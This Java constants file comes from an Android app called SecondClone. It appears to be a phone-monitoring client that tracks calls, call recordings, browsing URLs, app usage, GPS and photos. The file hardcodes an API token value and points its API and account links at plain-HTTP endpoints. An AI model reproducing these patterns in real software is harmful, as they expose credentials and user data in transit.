/*
  ClassName: Global.java
  @Project: SecondClone
  @author  Lucas Walker (lucas.walker@jexpa.com)
  Created Date: 2018-06-05
  Description: Class Global is use to declare constant variables for other classes to call and use
  History:2018-10-08
  Copyright © 2018 Jexpa LLC. All rights reserved.
 */

package com.jexpa.secondclone.API;

import android.os.Environment;

public class Global {

    public static final String TIME_DEFAULT = "1997-07-03 00:00:00";
    static final String INPUTVALUE = "InputValue";
    static final String TOKENKEY = "TokenKey";
    static final String VALUE_TOKENKEY = "23456";
    public static final String FUNCTION = "Function";
    static final String ISPUBLIC = "IsPublic";
    static final String VALUE_ISPUBLIC = "1";
    static final String ACCEPT = "Accept";
    static final String VALUE_ACCEPT = "application/json";
    static final String CONTENT_TYPE = "Content-type";
    static final String VALUE_CONTENT_TYPE = "application/json";


    /**
     * MyDatabase
     */

    public static final String TAG = "SQLite";
    public static String MODEL = "Android  " + android.os.Build.VERSION.RELEASE;

    /**
     * Default date format.
     */

    static final String DEFAULT_DATETIME_FORMAT = "yyyy-MM-dd HH:mm:ss";
    public static final String DEFAULT_DATE_FORMAT = "yyyy-MM-dd";
    public static final String DEFAULT_DATE_FORMAT_MMM = "MMM dd, yyyy";
    public static final String DEFAULT_TIME_FORMAT = "HH:mm:ss";
    public static final String DEFAULT_TIME_FORMAT_AM = "hh:mm aa";
    public static final String DEFAULT_TIME_START = " 00:00:00";
    public static final String DEFAULT_TIME_END = " 23:59:59";
    public static final String DEFAULT_DATETIME_FORMAT_AM = "yyyy-MM-dd hh:mm aa";
    static final String DEFAULT_DATETIME_MAX_DATE = "yyyy-MM-dd 23:59:59";

    /**
     * Time Refresh List.
     */

    public static final long LIMIT_REFRESH = 5000;
    public static long time_Refresh_Device = 534112;
    public static long time_Refresh_Setting = 534000;
    public static final long DATE = 1000 * 60 * 60 * 24;
    public static final long HOUR_MILLIS = 1000 * 60 * 60;
    public static final String MIN_TIME = "2000-05-08 00:00:00";


    /**
     * SharedPreferences
     */
    public static final String SETTINGS = "Setting";
    public static final String CONTACT_TOTAL = "Contact_Total";
    public static final String CALL_TOTAL = "Call_Total";
    public static final String PHONE_CALL_RECORDING_TOTAL = "Phone_Call_Total";
    public static final String URL_TOTAL = "URL_Total";
    public static final String APP_USAGE_TOTAL = "App_Usage_Total";
    public static final String GPS_TOTAL = "GPS_Total";
    public static final String PHOTO_TOTAL = "Photo_Total";


    /**
     * Value variable of intent class MainActivity.
     * Name Intent GPS Interval.
     * Name Intent Access Code.
     */

    public static final int REQUEST_CODE_GPS_ACCESS_CODE = 2;

    /**
     * Event onBack exit App.
     */

    public static int ON_BACK = 1;
    public static int NumberLoad = 20;

    /**
     * Distributing
     */

    public static String DEFAULT_PROTOCOL_LINK = "http://protocol.secondclone.uss/api/apiv2";
    public static String DEFAULT_LINK_FORGETPASSWORD = "http://my.secondclone.us/Account/ForgotPassword";
    public static String DEFAULT_LINK_ABOUTUS = "http://secondclone.us/about-us/";
    public static String DEFAULT_LINK_REGISTER = "http://my.secondclone.us/Account/SignUp";
    public static String DEFAULT_LINK_RENEW = "http://my.secondclone.us/Prices";
    public static String DEFAULT_PRODUCT_NAME = "SecondClone";
    public static String DEFAULT_VERSION_NAME = "1.01.16";
    public static String DEFAULT_COPYRIGHT = "Copyright © 2010-2018 SecondClone. All rights reserved";
    public static String DEFAULT_LOGO_IMAGE_PATH = "http://my.secondclone.us/favicon.ico";
    public static final String File_PATH_SAVE_PHONE_CALL_RECORD = Environment.getExternalStorageDirectory() + "/" + DEFAULT_PRODUCT_NAME;
    public static final String File_PATH_SAVE_IMAGE = Environment.getExternalStorageDirectory() + "/" + DEFAULT_PRODUCT_NAME + "/Picture";

}
